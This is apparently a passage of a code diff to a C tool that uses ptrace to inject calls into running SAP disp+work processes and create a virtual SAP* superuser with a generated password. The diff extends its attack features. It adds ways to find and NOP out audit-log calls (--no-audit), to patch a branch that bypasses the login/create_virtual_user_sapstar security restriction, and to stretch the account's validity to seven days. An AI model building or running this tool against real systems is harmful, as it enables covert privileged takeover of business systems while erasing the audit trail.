@@ -105,6 +105,36 @@
 #define SYM_WHOAMI     "whoami"
 #define SYM_VIRT_HDL   "_ZL14VirtualUserHdl"
 #define SYM_AUDIT_LOG  "_ZL29virtual_user_audit_log_createPKDsN12SAP_KRN_SIGN20VIRTUAL_USER_PURPOSEEib"
+/* Some kernel builds don't wrap the audit write in virtual_user_audit_log_
+ * create at all — create_virtual_user_internal calls the low-level audit
+ * writer directly instead (rsauwri2ex — the versioned successor to
+ * rsauwr1ex, which sap_audit_hook.c already hooks on the 916 reference
+ * build). Tried as a fallback candidate when SYM_AUDIT_LOG doesn't resolve. */
+#define SYM_AUDIT_LOG_ALT "rsauwri2ex"
+#define SYM_DISABLED   "_ZN12SAP_KRN_SIGN14LogonConstants32is_virtual_user_sapstar_disabledEv"
+#define SYM_SET_SESSION "_Z21ThWpSetCurrentSession15DP_SESSION_INFO"
+/* GCC isra-cloned local symbol — suffix is compiler/build-specific and not
+ * guaranteed stable across all builds, but observed identical on both the
+ * kernel-916 reference build and the 7.93 PL101 build. ELF resolution still
+ * aborts cleanly (no hardcoded-offset fallback exists for this) if a build
+ * doesn't have this exact name. */
+#define SYM_GLOBAL_AREAS "_ZL16dyGetGlobalAreasv.isra.0"
+#define SYM_FILLENQUE  "_ZL23LocFunc_FillEnqueStructPDshP11EnsaRequest"
+/* Generous window covering LocFunc_FillEnqueStruct's whole body — used only
+ * to bound where a SIGSEGV is considered "the known recoverable null-deref"
+ * under the enqueue-crash recovery (on by default). Doesn't need to be exact; it's a safety fence,
+ * not an offset we trust blindly (the actual instruction bytes are still
+ * checked before anything is patched). */
+#define FILLENQUE_WINDOW 0x1000UL
+
+/* Sentinel DP_SESSION_INFO used by --set-session: matches the value ThStart's
+ * own dispatch loop builds for this exact request path (external/admin
+ * requests not tied to a specific ABAP user session) before looking up the
+ * request handler and calling it — low 56 bits forced to all-1s ("no specific
+ * session"), top byte left 0. Not a guess: reverse-engineered from ThStart's
+ * `or $0x00ffffffffffffff, stack_val` immediately preceding the real
+ * ThWpSetCurrentSession call on this same dispatch path. */
+#define DP_SESSION_INFO_NONE 0x00ffffffffffffffULL
 
 #define PW_BUF_CHARS  40
 #define RC_OK         0
@@ -115,60 +145,77 @@
  * from the ELF binary on disk. Works for both T (global) and t (local) symbols.
  * Returns 0 if not found.
  */
-static uintptr_t elf_resolve_symbol(const char *binary_path, const char *sym_name) {
+/*
+ * Batch variant: resolves `n` symbol names in a single pass over the binary.
+ * One open(), one bulk read of the symtab (or dynsym) and its strtab, one
+ * linear scan matching every wanted name — instead of re-opening the file
+ * and re-scanning the whole symtab from scratch per name (this binary's
+ * symtab can be tens of thousands of entries; doing that 6x, with a pread()
+ * syscall per individual Elf64_Sym, was the actual cost driver).
+ * results[i] is left at 0 if names[i] isn't found.
+ */
+static void elf_resolve_symbols(const char *binary_path,
+                                 const char *const *names, uintptr_t *results, int n) {
+    for (int i = 0; i < n; i++) results[i] = 0;
+
     int fd = open(binary_path, O_RDONLY);
-    if (fd < 0) return 0;
+    if (fd < 0) return;
 
-    struct stat st;
-    if (fstat(fd, &st) < 0) { close(fd); return 0; }
-
-    /* Read ELF header */
     Elf64_Ehdr ehdr;
-    if (pread(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) { close(fd); return 0; }
-    if (memcmp(ehdr.e_ident, ELFMAG, 4) != 0) { close(fd); return 0; }
+    if (pread(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) { close(fd); return; }
+    if (memcmp(ehdr.e_ident, ELFMAG, 4) != 0) { close(fd); return; }
 
-    /* Walk section headers looking for SHT_SYMTAB then SHT_DYNSYM */
+    Elf64_Shdr *shdrs = malloc((size_t)ehdr.e_shnum * sizeof(Elf64_Shdr));
+    if (!shdrs) { close(fd); return; }
+    if (pread(fd, shdrs, (size_t)ehdr.e_shnum * sizeof(Elf64_Shdr), ehdr.e_shoff)
+            != (ssize_t)((size_t)ehdr.e_shnum * sizeof(Elf64_Shdr))) {
+        free(shdrs); close(fd); return;
+    }
+
+    /* Prefer SHT_SYMTAB (full table); fall back to SHT_DYNSYM. */
     uint32_t shtype_priority[] = { SHT_SYMTAB, SHT_DYNSYM, 0 };
-    uintptr_t result = 0;
+    int remaining = n;
 
-    for (int pass = 0; shtype_priority[pass] && !result; pass++) {
+    for (int pass = 0; shtype_priority[pass] && remaining; pass++) {
         uint32_t want_type = shtype_priority[pass];
 
-        for (int i = 0; i < ehdr.e_shnum && !result; i++) {
-            Elf64_Shdr shdr;
-            off_t sh_off = ehdr.e_shoff + (off_t)i * ehdr.e_shentsize;
-            if (pread(fd, &shdr, sizeof(shdr), sh_off) != sizeof(shdr)) continue;
-            if (shdr.sh_type != want_type) continue;
+        for (int i = 0; i < ehdr.e_shnum && remaining; i++) {
+            Elf64_Shdr *shdr = &shdrs[i];
+            if (shdr->sh_type != want_type) continue;
+            if (shdr->sh_link >= (uint32_t)ehdr.e_shnum) continue;
+            Elf64_Shdr *strhdr = &shdrs[shdr->sh_link];
 
-            /* Found a symbol table section; get its string table */
-            Elf64_Shdr strhdr;
-            off_t str_off = ehdr.e_shoff + (off_t)shdr.sh_link * ehdr.e_shentsize;
-            if (pread(fd, &strhdr, sizeof(strhdr), str_off) != sizeof(strhdr)) continue;
-
-            /* Read string table */
-            char *strtab = malloc(strhdr.sh_size);
+            char *strtab = malloc(strhdr->sh_size);
             if (!strtab) continue;
-            if (pread(fd, strtab, strhdr.sh_size, strhdr.sh_offset) != (ssize_t)strhdr.sh_size) {
+            if (pread(fd, strtab, strhdr->sh_size, strhdr->sh_offset) != (ssize_t)strhdr->sh_size) {
                 free(strtab); continue;
             }
 
-            /* Scan symbols */
-            size_t nsyms = shdr.sh_size / sizeof(Elf64_Sym);
-            for (size_t j = 0; j < nsyms && !result; j++) {
-                Elf64_Sym sym;
-                off_t sym_off = shdr.sh_offset + (off_t)j * sizeof(sym);
-                if (pread(fd, &sym, sizeof(sym), sym_off) != sizeof(sym)) continue;
-                if (sym.st_value == 0) continue;
-                if (sym.st_name >= strhdr.sh_size) continue;
-                if (strcmp(strtab + sym.st_name, sym_name) == 0) {
-                    result = (uintptr_t)sym.st_value;
+            size_t nsyms = shdr->sh_size / sizeof(Elf64_Sym);
+            Elf64_Sym *syms = malloc(nsyms * sizeof(Elf64_Sym));
+            if (!syms) { free(strtab); continue; }
+            if (pread(fd, syms, nsyms * sizeof(Elf64_Sym), shdr->sh_offset)
+                    != (ssize_t)(nsyms * sizeof(Elf64_Sym))) {
+                free(syms); free(strtab); continue;
+            }
+
+            for (size_t j = 0; j < nsyms && remaining; j++) {
+                if (syms[j].st_value == 0) continue;
+                if (syms[j].st_name >= strhdr->sh_size) continue;
+                const char *sym_name = strtab + syms[j].st_name;
+                for (int k = 0; k < n; k++) {
+                    if (!results[k] && !strcmp(sym_name, names[k])) {
+                        results[k] = (uintptr_t)syms[j].st_value;
+                        remaining--;
+                    }
                 }
             }
+            free(syms);
             free(strtab);
         }
     }
+    free(shdrs);
     close(fd);
-    return result;
 }
 
 /* ── Find all disp+work PIDs ──────────────────────────────────────────── */
@@ -386,12 +433,43 @@ static uintptr_t find_syscall_site(pid_t pid, uintptr_t base, size_t scan) {
  */
 #define SCRATCH_SIZE 0x100000  /* 1 MB — 64KB wasn't enough, function's stack frame overruns it */
 
+/*
+ * Recognize a 3-byte simple register-indirect load — REX prefix (0x40-0x4f)
+ * + 0x8B opcode + modrm with mod==00 and rm not in {4,5} (no SIB, no
+ * rip-relative) — i.e. `mov reg32/64, [reg]` with no displacement. This is
+ * the exact shape of the crashing instruction inside LocFunc_FillEnqueStruct
+ * (`41 8b 0b` = mov (%r11),%ecx) when it dereferences a null pointer read
+ * from a per-task field that's only populated during real request dispatch.
+ * Returns instruction length (3) if it matches, 0 otherwise.
+ */
+static int decode_simple_mov_load(const uint8_t *b) {
+    if ((b[0] & 0xf0) != 0x40) return 0;         /* REX prefix */
+    if (b[1] != 0x8b) return 0;                  /* MOV r, r/m */
+    uint8_t modrm = b[2];
+    uint8_t mod = (modrm >> 6) & 0x3;
+    uint8_t rm  = modrm & 0x7;
+    if (mod != 0) return 0;                      /* no displacement */
+    if (rm == 4 || rm == 5) return 0;             /* no SIB, no rip-relative */
+    return 3;
+}
+
 static int call_in_target(pid_t pid, struct user_regs_struct *saved,
                            uintptr_t scratch_rw,  /* R/W data+stack page */
                            uintptr_t trap_site,   /* text location for INT3 trap */
                            uintptr_t fn,
                            uintptr_t a1, uintptr_t a2, long a3, long a4,
-                           int singlestep, uintptr_t base) {
+                           int singlestep, uintptr_t base,
+                           int *ok_out, /* optional: set 1 if the call returned
+                                        * cleanly via trap_site, 0 otherwise
+                                        * (crash/wrong stop). NULL to ignore. */
+                           uintptr_t recover_lo, uintptr_t recover_hi
+                           /* optional [lo,hi) text range in which a SIGSEGV is
+                            * treated as a known, recoverable null-deref rather
+                            * than fatal: verify the faulting instruction is
+                            * the simple-load shape above, zero its destination
+                            * register, skip past it, and keep running. Both 0
+                            * disables recovery (original behavior). */) {
+    if (ok_out) *ok_out = 0;
     /* Plant INT3 at trap_site in text (PTRACE_POKETEXT bypasses r-x perms) */
     uint8_t trap_orig[1];
     uint8_t trap_byte[1] = { 0xcc };
@@ -459,8 +537,8 @@ static int call_in_target(pid_t pid, struct user_regs_struct *saved,
                         rax_err ? strerror(rax_err) : "");
 
                 /* Dump the "this" object (rax) and its vtable ([rax]) fields,
-                 * same layout as memdump's healthy global1 dump, to find where
-                 * the expected vtable slot falls off mapped memory. */
+                 * to find where the expected vtable slot falls off mapped
+                 * memory. */
                 fprintf(stderr, "[singlestep] object @ rax=0x%llx:\n", sr.rax);
                 for (int i = 0; i < 8; i++) {
                     errno = 0;
@@ -483,17 +561,6 @@ static int call_in_target(pid_t pid, struct user_regs_struct *saved,
                         }
                     }
                 }
-
-                uintptr_t g1 = base + 0x70AF900;
-                uintptr_t g2 = base + 0x70AF728;
-                errno = 0;
-                long g1v = ptrace(PTRACE_PEEKTEXT, pid, (void*)g1, 0);
-                fprintf(stderr, "[singlestep] global1 (0x70AF900) = 0x%lx%s\n",
-                        (unsigned long)g1v, errno ? " (peek FAILED)" : "");
-                errno = 0;
-                long g2v = ptrace(PTRACE_PEEKTEXT, pid, (void*)g2, 0);
-                fprintf(stderr, "[singlestep] global2 (0x70AF728) = 0x%lx%s\n",
-                        (unsigned long)g2v, errno ? " (peek FAILED)" : "");
                 break;
             }
             if (sr.rip == trap_site) {
@@ -514,8 +581,53 @@ static int call_in_target(pid_t pid, struct user_regs_struct *saved,
                     ring[idx].rsi, ring[idx].r9, ring[idx].rbx);
         }
     } else {
-        ptrace(PTRACE_CONT, pid, 0, 0);
-        waitpid(pid, &ws, 0);
+        int recover_budget = 16; /* cap: never loop forever on repeated faults */
+        for (;;) {
+            ptrace(PTRACE_CONT, pid, 0, 0);
+            waitpid(pid, &ws, 0);
+            if (!WIFSTOPPED(ws) || WSTOPSIG(ws) != SIGSEGV) break;
+            if (!(recover_lo && recover_hi) || recover_budget <= 0) break;
+
+            struct user_regs_struct fr;
+            ptrace(PTRACE_GETREGS, pid, 0, &fr);
+            if (fr.rip < recover_lo || fr.rip >= recover_hi) break;
+
+            uint8_t ibuf[4] = {0};
+            if (mem_read(pid, fr.rip, ibuf, sizeof(ibuf)) != 0) break;
+            int ilen = decode_simple_mov_load(ibuf);
+            if (!ilen) break; /* not the known shape — don't guess, treat as fatal */
+
+            int reg_idx = ((ibuf[0] & 0x4) << 1) | ((ibuf[2] >> 3) & 0x7); /* REX.R:reg */
+            unsigned long long *slot = NULL;
+            switch (reg_idx) {
+                case 0: slot = (unsigned long long*)&fr.rax; break;
+                case 1: slot = (unsigned long long*)&fr.rcx; break;
+                case 2: slot = (unsigned long long*)&fr.rdx; break;
+                case 3: slot = (unsigned long long*)&fr.rbx; break;
+                case 4: slot = (unsigned long long*)&fr.rsp; break;
+                case 5: slot = (unsigned long long*)&fr.rbp; break;
+                case 6: slot = (unsigned long long*)&fr.rsi; break;
+                case 7: slot = (unsigned long long*)&fr.rdi; break;
+                case 8: slot = (unsigned long long*)&fr.r8;  break;
+                case 9: slot = (unsigned long long*)&fr.r9;  break;
+                case 10: slot = (unsigned long long*)&fr.r10; break;
+                case 11: slot = (unsigned long long*)&fr.r11; break;
+                case 12: slot = (unsigned long long*)&fr.r12; break;
+                case 13: slot = (unsigned long long*)&fr.r13; break;
+                case 14: slot = (unsigned long long*)&fr.r14; break;
+                case 15: slot = (unsigned long long*)&fr.r15; break;
+            }
+            if (!slot) break;
+
+            fprintf(stderr,
+                "[*] Recovered from expected null-deref at 0x%llx "
+                "(zeroed reg #%d, skipped %d bytes, %d attempt(s) left)\n",
+                fr.rip, reg_idx, ilen, recover_budget - 1);
+            *slot = 0;
+            fr.rip += ilen;
+            ptrace(PTRACE_SETREGS, pid, 0, &fr);
+            recover_budget--;
+        }
     }
     /* Restore INT3 site regardless of how we stopped */
     poke_text(pid, trap_site, trap_orig, 1);
@@ -538,6 +650,8 @@ static int call_in_target(pid_t pid, struct user_regs_struct *saved,
             "(expected trap_site+1=0x%lx), rax=0x%llx rsp=0x%llx\n",
             sig, strsignal(sig), res.rip, trap_site + 1,
             res.rax, res.rsp);
+    } else if (ok_out) {
+        *ok_out = 1;
     }
     return (int)(int32_t)res.rax;
 }
@@ -574,6 +688,45 @@ static void usage(const char *p) {
 "                   Combine with -P 2 (or normal mode) for a loginable slot\n"
 "                   regardless of the profile parameter's value.\n"
 "  -P <1|2|3>     Override purpose in bypass mode (default with --bypass: 1)\n"
+"  --force-legacy-offsets  If ELF symbol lookup fails, use hardcoded kernel-916\n"
+"                   nm offsets anyway instead of aborting. UNSAFE on a kernel\n"
+"                   build/release the offsets weren't taken from — can corrupt\n"
+"                   the target process. Only use if you've verified the layout.\n"
+"  --set-session  FALLBACK, not needed on tested builds (7.93 PL101, kernel\n"
+"                   916 reference) — --no-patch-enque-crash's live recovery\n"
+"                   already handles the enqueue-lock crash on those. Calls\n"
+"                   ThWpSetCurrentSession(no-session-sentinel) on the target\n"
+"                   work process immediately before create_virtual_*, priming\n"
+"                   per-task session state the way ThStart's own dispatch\n"
+"                   loop does for this request type. Tested and confirmed\n"
+"                   NOT sufficient by itself to fix the LocFunc_FillEnqueStruct\n"
+"                   null-deref (see --fill-global-areas too) — kept in case a\n"
+"                   different kernel build hits a genuinely different missing-\n"
+"                   context crash that the live-recovery patch doesn't cover.\n"
+"                   Off by default.\n"
+"  --fill-global-areas  FALLBACK, not needed on tested builds — same status\n"
+"                   as --set-session above. Calls dyGetGlobalAreas() (no\n"
+"                   args) on the target work process immediately before\n"
+"                   create_virtual_*; that's the function that populates the\n"
+"                   per-task ABAP runtime-area pointers (user info/data, SAP\n"
+"                   memory, ABAP logon memory) the enqueue-lock helper reads.\n"
+"                   Tested and confirmed to hit its own SIGABRT (an internal\n"
+"                   precondition inside one of its sub-calls) rather than\n"
+"                   fixing anything — kept only as a documented fallback for\n"
+"                   a future build where the root cause differs. Off by\n"
+"                   default.\n"
+"  --no-patch-enque-crash  On by default: the call runs and if it hits the\n"
+"                   known null-deref inside LocFunc_FillEnqueStruct (an\n"
+"                   enqueue-lock helper reached via a lazy crypto self-test\n"
+"                   during password generation, unrelated to the actual HMAC\n"
+"                   computation), verify the exact faulting instruction\n"
+"                   shape live, zero its destination register, skip 3 bytes,\n"
+"                   and resume. Self-contained: only intervenes when both\n"
+"                   the address and instruction shape are live-verified, so\n"
+"                   it's a no-op on builds/worker-states where the crash\n"
+"                   doesn't happen (e.g. an already-warmed worker, or a\n"
+"                   kernel build that never hits this path). Pass this flag\n"
+"                   to disable it and see the raw crash instead.\n"
 "  -e <path>      Path to disp+work binary for symbol resolution\n"
 "  -p <hint>      Substring to filter disp+work exe path (multi-SID hosts)\n"
 "  --pid <pid>    Target this PID directly, skipping the work-process scan\n"
@@ -609,6 +762,12 @@ int main(int argc, char *argv[]) {
     const char *elf_path = NULL;
     pid_t pid_override = 0;
     int  singlestep    = 0;
+    int  force_legacy  = 0;
+    int  set_session   = 0;
+    int  fill_areas    = 0;
+    int  patch_enque   = 1; /* on by default — only intervenes on a live-verified
+                              * known-safe crash, no-op otherwise. See
+                              * --no-patch-enque-crash to disable. */
 
     for (int i = 1; i < argc; i++) {
         if      (!strcmp(argv[i],"-c") && i+1<argc) { client   = argv[++i]; }
@@ -621,6 +780,10 @@ int main(int argc, char *argv[]) {
         else if (!strcmp(argv[i],"--bypass"))        { bypass    = 1; }
         else if (!strcmp(argv[i],"--no-audit"))      { no_audit  = 1; }
         else if (!strcmp(argv[i],"--no-profile-check")) { no_profile_check = 1; }
+        else if (!strcmp(argv[i],"--force-legacy-offsets")) { force_legacy = 1; }
+        else if (!strcmp(argv[i],"--set-session"))   { set_session = 1; }
+        else if (!strcmp(argv[i],"--fill-global-areas")) { fill_areas = 1; }
+        else if (!strcmp(argv[i],"--no-patch-enque-crash")) { patch_enque = 0; }
         else if (!strcmp(argv[i],"-q"))              { quiet     = 1; }
         else if (!strcmp(argv[i],"-h"))              { usage(argv[0]); }
         else { fprintf(stderr,"Unknown: %s\n",argv[i]); usage(argv[0]); }
@@ -633,6 +796,14 @@ int main(int argc, char *argv[]) {
         fprintf(stderr, "[-] Validity must be 10-30 without --bypass. "
                         "Use --bypass for extended range.\n"); return 1;
     }
+    if (bypass && (validity < 0 || validity > 10080)) {
+        fprintf(stderr,
+            "[-] Validity must be 0-10080 min (7 days) with --bypass —\n"
+            "    create_virtual_user_internal itself rejects anything outside\n"
+            "    this range (rc=3 INVALID_VALIDITY) after attach/injection, so\n"
+            "    this check catches it client-side first. Got %d.\n", validity);
+        return 1;
+    }
     if (purpose < 0) purpose = bypass ? 1 : 2;
 
     /* ── Enumerate all disp+work processes ──────────────────────────────── */
@@ -644,23 +815,49 @@ int main(int argc, char *argv[]) {
     if (!elf_path) elf_path = exe_path;
 
     /* ── Resolve symbols from ELF (version-independent) ─────────────── */
-    uintptr_t off_anchor   = elf_resolve_symbol(elf_path, SYM_ANCHOR);
-    uintptr_t off_sapstar  = elf_resolve_symbol(elf_path, SYM_SAPSTAR);
-    uintptr_t off_internal = elf_resolve_symbol(elf_path, SYM_INTERNAL);
-    uintptr_t off_whoami   = elf_resolve_symbol(elf_path, SYM_WHOAMI);
-    uintptr_t off_vhdl     = elf_resolve_symbol(elf_path, SYM_VIRT_HDL);
-    uintptr_t off_audit    = elf_resolve_symbol(elf_path, SYM_AUDIT_LOG);
+    const char *sym_names[] = { SYM_ANCHOR, SYM_SAPSTAR, SYM_INTERNAL,
+                                 SYM_WHOAMI, SYM_VIRT_HDL, SYM_AUDIT_LOG,
+                                 SYM_DISABLED, SYM_SET_SESSION, SYM_GLOBAL_AREAS,
+                                 SYM_FILLENQUE, SYM_AUDIT_LOG_ALT };
+    uintptr_t sym_off[11];
+    elf_resolve_symbols(elf_path, sym_names, sym_off, 11);
+    uintptr_t off_anchor   = sym_off[0];
+    uintptr_t off_sapstar  = sym_off[1];
+    uintptr_t off_internal = sym_off[2];
+    uintptr_t off_whoami   = sym_off[3];
+    uintptr_t off_vhdl     = sym_off[4];
+    uintptr_t off_audit    = sym_off[5];
+    uintptr_t off_disabled = sym_off[6];
+    uintptr_t off_set_session = sym_off[7];
+    uintptr_t off_global_areas = sym_off[8];
+    uintptr_t off_fillenque = sym_off[9];
+    uintptr_t off_audit_alt = sym_off[10];
 
     if (off_anchor && off_sapstar && off_internal) {
         if (!quiet) printf("[*] Symbols resolved from ELF\n");
-    } else {
-        if (!quiet) printf("[!] ELF symbols not found — using kernel 916 offsets\n");
+    } else if (force_legacy) {
+        if (!quiet) printf("[!] ELF symbols not found — --force-legacy-offsets given, "
+                            "using kernel 916 offsets (UNSAFE on other kernel builds)\n");
         off_anchor   = NM_K916_ANCHOR;
         off_sapstar  = NM_K916_CREATE_SAPSTAR;
         off_internal = NM_K916_CREATE_INTERNAL;
         off_whoami   = NM_K916_WHOAMI;
         off_vhdl     = NM_K916_VIRT_USER_HDL;
         off_audit    = 0;  /* use hardcoded call-site offsets below */
+    } else {
+        fprintf(stderr,
+            "[-] ELF symbol resolution failed for one or more of: %s, %s, %s\n"
+            "    This binary is not the kernel-916 build the hardcoded fallback\n"
+            "    offsets were reverse-engineered from (different kernel release/\n"
+            "    patch level, e.g. 7.93 or a recompiled 9.x kernel). Blindly using\n"
+            "    the fallback offsets on a mismatched binary calls into the wrong\n"
+            "    address and corrupts the target process (observed: SIGSEGV deep in\n"
+            "    disp+work, or a wild jump near the ELF load base).\n"
+            "    Refusing to proceed. If you have verified this binary layout matches\n"
+            "    kernel 916 (e.g. same build, just stripped symtab), re-run with\n"
+            "    --force-legacy-offsets to override at your own risk.\n",
+            SYM_ANCHOR, SYM_SAPSTAR, SYM_INTERNAL);
+        return 1;
     }
 
     /*
@@ -714,6 +911,7 @@ int main(int argc, char *argv[]) {
     uintptr_t syscall_site = find_syscall_site(pid, base, 0x100000);
     if (!syscall_site) {
         fprintf(stderr, "[-] No syscall instruction found in text\n");
+        ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
         ptrace(PTRACE_DETACH, pid, 0, 0); return 1;
     }
 
@@ -737,6 +935,7 @@ int main(int argc, char *argv[]) {
         fprintf(stderr, "[-] mmap failed: %ld (%s)\n", scratch,
                 scratch == -1  ? "EPERM — check SELinux/seccomp" :
                 scratch == -12 ? "ENOMEM"  : "see errno");
+        ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
         ptrace(PTRACE_DETACH, pid, 0, 0); return 1;
     }
     if (!quiet) printf("[*] R/W scratch (1MB): 0x%lx\n", scratch);
@@ -797,41 +996,240 @@ int main(int argc, char *argv[]) {
                 }
             }
         }
-        if (audit_count == 0) {
-            /* Fallback: kernel 916 hardcoded nm offsets */
+        if (audit_count == 0 && off_audit_alt) {
+            /* Some builds don't wrap the audit write in a virtual_user_
+             * audit_log_create helper at all — create_virtual_user_internal
+             * calls the low-level writer (rsauwri2ex) directly. Same scan,
+             * different target symbol. */
+            uintptr_t fn_rt    = base + off_internal;
+            uintptr_t audit_rt = base + off_audit_alt;
+            uint8_t   fbuf[0x1000];
+            if (mem_read(pid, fn_rt, fbuf, sizeof(fbuf)) == 0) {
+                for (size_t i = 0; i + 5 <= sizeof(fbuf) && audit_count < 2; i++) {
+                    if (fbuf[i] != 0xe8) continue;
+                    int32_t rel; memcpy(&rel, fbuf + i + 1, 4);
+                    uintptr_t target = fn_rt + i + 5 + (uintptr_t)(intptr_t)rel;
+                    if (target == audit_rt)
+                        audit_site[audit_count++] = fn_rt + i;
+                }
+            }
+        }
+        if (audit_count == 0 && force_legacy) {
+            /* Fallback: kernel 916 hardcoded nm offsets. Only under
+             * --force-legacy-offsets — these are absolute addresses from a
+             * single reference build; on any other build/layout they land
+             * in unrelated code and NOPing them corrupts the live process
+             * (confirmed: on a 7.93 PL101 build, off_internal sits ~1.9MB
+             * away from the 916 reference and neither hardcoded address is
+             * even a `call` instruction there). The byte checks below are a
+             * second line of defense in case the offsets happen to collide
+             * with some unrelated `e8` byte by chance. */
             audit_site[0] = base + NM_K916_AUDIT_SUCCESS;
             audit_site[1] = base + NM_K916_AUDIT_DISABLED;
             audit_count   = 2;
         }
+        if (audit_count == 0) {
+            fprintf(stderr,
+                "[-] --no-audit: couldn't locate the audit-log call site(s)\n"
+                "    dynamically (virtual_user_audit_log_create symbol missing\n"
+                "    on this build — it may have been renamed/refactored, e.g.\n"
+                "    split into separate check/login functions). Refusing to\n"
+                "    guess an offset — NOPing the wrong address corrupts the\n"
+                "    live process. Re-run with --force-legacy-offsets to use\n"
+                "    the kernel-916 hardcoded offsets anyway (unsafe here).\n");
+            ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
+            ptrace(PTRACE_DETACH, pid, 0, 0);
+            return 1;
+        }
         for (int i = 0; i < audit_count; i++) {
             peek_text_n(pid, audit_site[i], audit_orig[i], 5);
+            if (audit_orig[i][0] != 0xe8) {
+                fprintf(stderr,
+                    "[-] --no-audit: expected `call` (0xe8) at 0x%lx, found 0x%02x.\n"
+                    "    This address doesn't hold a call instruction on this\n"
+                    "    binary — refusing to NOP it (would corrupt unrelated\n"
+                    "    code). Aborting before any patch was applied.\n",
+                    audit_site[i], audit_orig[i][0]);
+                ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
+                ptrace(PTRACE_DETACH, pid, 0, 0);
+                return 1;
+            }
             poke_text_n(pid, audit_site[i], nop5, 5);
         }
         if (!quiet) printf("[*] Audit log suppressed (%d call site(s) NOPed)\n", audit_count);
     }
 
     /* ── Optionally bypass login/create_virtual_user_sapstar (--no-profile-check) ──
-     * One-byte patch: JE (0x74) -> JMP (0xEB) at NM_K916_PROFILE_CHECK_OFF, the
-     * branch taken inside create_virtual_user_internal when purpose==2 and the
-     * profile param is NOT disabled. Forcing it unconditional makes the
-     * "allowed" path run regardless of the profile param's value.
+     * One-byte patch: JE (0x74) -> JMP (0xEB) on the branch taken inside
+     * create_virtual_user_internal when purpose==2 and the profile param is
+     * NOT disabled. Forcing it unconditional makes the "allowed" path run
+     * regardless of the profile param's value.
+     *
+     * Located dynamically: scan create_virtual_user_internal's body for
+     * `call is_virtual_user_sapstar_disabled`, then the `test al,al ; je`
+     * immediately after it (same technique as the --no-audit call-site scan).
+     * A hardcoded relative byte offset from a single reference build breaks
+     * across kernel patch levels/builds since even semantically-identical
+     * code can shift by a few bytes — this scan is layout-independent as
+     * long as the symbol and the compiler's test+je idiom are still there.
      */
-    uintptr_t profile_site = base + off_internal + NM_K916_PROFILE_CHECK_OFF;
+    uintptr_t profile_site = 0;
     uint8_t   profile_orig = 0;
     if (no_profile_check) {
-        peek_text_n(pid, profile_site, &profile_orig, 1);
-        if (profile_orig != 0x74) {
+        if (off_disabled) {
+            uintptr_t fn_rt       = base + off_internal;
+            uintptr_t disabled_rt = base + off_disabled;
+            uint8_t   fbuf[0x1000];
+            if (mem_read(pid, fn_rt, fbuf, sizeof(fbuf)) == 0) {
+                for (size_t i = 0; i + 5 <= sizeof(fbuf) && !profile_site; i++) {
+                    if (fbuf[i] != 0xe8) continue;
+                    int32_t rel; memcpy(&rel, fbuf + i + 1, 4);
+                    uintptr_t target = fn_rt + i + 5 + (uintptr_t)(intptr_t)rel;
+                    if (target != disabled_rt) continue;
+
+                    /* Found the call; look for `test al,al` (84 c0) shortly
+                     * after it, followed immediately by `je rel8` (74 xx). */
+                    size_t call_end = i + 5;
+                    for (size_t k = call_end; k + 4 <= sizeof(fbuf) && k < call_end + 16; k++) {
+                        if (fbuf[k] == 0x84 && fbuf[k+1] == 0xc0 && fbuf[k+2] == 0x74) {
+                            profile_site = fn_rt + k + 2;
+                            break;
+                        }
+                    }
+                }
+            }
+        } else {
+            /* Symbol genuinely doesn't exist on this binary — most likely
+             * this kernel predates SAP Note 3633474 (login/create_virtual_
+             * user_sapstar, first shipped 7.93 PL321 / 9.16 PL60), so the
+             * check itself doesn't exist yet. Nothing to bypass; that's a
+             * fine outcome, not a scan failure — continue without patching
+             * rather than aborting the whole run. */
+            if (!quiet) printf(
+                "[*] --no-profile-check: is_virtual_user_sapstar_disabled not found\n"
+                "    on this binary — likely predates SAP Note 3633474 (login/\n"
+                "    create_virtual_user_sapstar, 7.93 PL321 / 9.16 PL60). No\n"
+                "    check exists to bypass here; continuing without patching.\n");
+        }
+        if (!profile_site && force_legacy) {
+            profile_site = base + off_internal + NM_K916_PROFILE_CHECK_OFF;
+        }
+        if (!profile_site && off_disabled) {
+            /* Symbol was found but the expected idiom near its call site
+             * wasn't — an actual layout mismatch, not "feature absent".
+             * Unsafe to guess; abort rather than silently doing nothing. */
             fprintf(stderr,
-                "[-] --no-profile-check: expected JE (0x74) at 0x%lx, found 0x%02x.\n"
-                "    Offset doesn't match this binary's layout — refusing to patch\n"
-                "    (would corrupt unrelated code). Aborting.\n",
-                profile_site, profile_orig);
+                "[-] --no-profile-check: is_virtual_user_sapstar_disabled exists\n"
+                "    but the test+je idiom after its call site doesn't match —\n"
+                "    a different kernel build/PL layout. Refusing to guess an\n"
+                "    offset. Re-run with --force-legacy-offsets to use the\n"
+                "    kernel-916 hardcoded offset anyway (unsafe on other builds).\n");
+            ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
             ptrace(PTRACE_DETACH, pid, 0, 0);
             return 1;
         }
-        uint8_t jmp_byte = 0xEB;
-        poke_text_n(pid, profile_site, &jmp_byte, 1);
-        if (!quiet) printf("[*] login/create_virtual_user_sapstar check bypassed (1 byte patched)\n");
+        if (profile_site) {
+            peek_text_n(pid, profile_site, &profile_orig, 1);
+            if (profile_orig != 0x74) {
+                fprintf(stderr,
+                    "[-] --no-profile-check: expected JE (0x74) at 0x%lx, found 0x%02x.\n"
+                    "    Offset doesn't match this binary's layout — refusing to patch\n"
+                    "    (would corrupt unrelated code). Aborting.\n",
+                    profile_site, profile_orig);
+                ptrace(PTRACE_SETREGS, pid, 0, &saved);  /* restore before detach — don't resume mid-injected-call */
+                ptrace(PTRACE_DETACH, pid, 0, 0);
+                return 1;
+            }
+            uint8_t jmp_byte = 0xEB;
+            poke_text_n(pid, profile_site, &jmp_byte, 1);
+            if (!quiet) printf("[*] login/create_virtual_user_sapstar check bypassed (1 byte patched)\n");
+        }
+    }
+
+    /* ── Optionally populate ABAP runtime-area pointers (--fill-global-areas) ──
+     * dyGetGlobalAreas() (no args) writes dyGetUsrInfo()/dyGetUsrData()/
+     * dyGetSapMemory()/dySapMemorySize()/dyGetAbapLogonMemory() into the
